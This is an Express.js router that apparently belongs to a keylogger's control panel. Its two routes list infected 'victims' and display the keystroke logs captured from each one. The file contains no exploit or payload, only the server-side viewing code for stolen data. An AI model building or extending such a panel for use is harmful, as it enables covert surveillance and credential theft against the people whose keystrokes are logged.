'use strict'

const express = require('express')
const escapingFunctions = require('../middlewares/escaping')
const router = express.Router()
const clientService = require('../../services/clientService')
const keylogsService = require('../../services/keylogsService')

router.get('/', async (req, res, next) => {
    try {
        const clients = await clientService.getAll()
        
        //res.locals.clients = clients
        //console.log(res.locals.clients)

        res.render('pages/victims', {clients: clients})
    } catch (e) { next(e) }
})

router.get('/:uuid', async (req, res, next) => {
    try {
        const single_client = await clientService.findOneByUuid(req.params.uuid)
        const keylogs = await keylogsService.findAllByClientId(single_client.id)

        
        res.render('pages/single_victim', 
        {
            single_client: single_client,
            keylogs: keylogs
        })
    } catch (e) { next(e) }
})

module.exports = router